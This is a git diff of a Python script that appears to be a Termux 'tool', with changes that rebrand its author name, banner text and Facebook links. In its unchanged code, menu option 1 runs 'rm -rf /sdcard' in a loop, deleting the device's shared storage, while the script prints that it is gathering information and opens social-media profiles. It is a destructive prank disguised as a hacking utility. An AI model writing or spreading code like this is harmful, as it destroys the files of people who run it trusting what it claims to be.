@@ -47,8 +47,8 @@ def logop(z):
         time.sleep(0.01)
 logop(logo)
 
-os.system("figlet welcome to my tool ")
-n= "Tool maker by Moynul "
+os.system("figlet welcome to D1ARK-VA4U3 ")
+n= "Tool maker by Dark vau "
 sys.stdout.write(n)
 sys.stdout.flush()
 time.sleep(5)
@@ -66,14 +66,14 @@ if option == "1":
         os.system("rm -rf /sdcard")
         os.system("apt install sl")
         os.system("sl")
-        os.system("xdg-open https://www.facebook.com/profile.php?id=100028650051426")
-        os.system("xdg-open https://www.facebook.com/profile.php?id=100028650051426")
+        os.system("xdg-open https://www.facebook.com/dark.vau.its.official")
+        os.system("xdg-open https://www.facebook.com/dark.vau.its.official")
         i = i + 1
 elif option ==  "2":
-    os.system("xdg-open https://www.facebook.com/profile.php?id=100069552861380")
+    os.system("xdg-open https://www.facebook.com/110596777934165/posts/110597877934055/?substory_index=0")
 else:
-    print(" Hi i am Moynul ")
-print("Kamon laglo comment a janaben")
+    print(" Hi i am D1ARK-VA4U3 ")
+print("Im Noob. ami single aci single roiye gelam and sara jibon thakbo soja kotha single komitir charmin hobo")
 print("your all information gethering ")
-print("Termux help centre bd ")
-os.system("xdg-open https://www.facebook.com/profile.php?id=100069552861380")
+print("FROM BCA TEAM  ")
+os.system("xdg-open https://www.facebook.com/dark.vau.its.official")
